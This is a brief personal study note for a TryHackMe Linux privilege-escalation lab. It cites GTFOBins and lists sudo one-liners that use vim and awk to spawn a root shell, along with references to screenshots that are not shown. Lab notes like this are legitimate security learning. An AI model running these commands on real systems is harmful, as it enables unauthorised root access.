https://tryhackme.com/room/linuxprivesc
# Identification
---
![[Pasted image 20250428150414.png]]

# Exploitation
---
- From https://gtfobins.github.io/:
	- ![[Pasted image 20250428150522.png]]

- `sudo vim -c ':!/bin/bash'`
	- ![[Pasted image 20250428150711.png]]
- `awk`:
	- ![[Pasted image 20250428150821.png]]
	- `sudo awk 'BEGIN {system("/bin/sh")}'`
	- ![[Pasted image 20250428150900.png]]
- `more`:
	- ![[Pasted image 20250428151423.png]]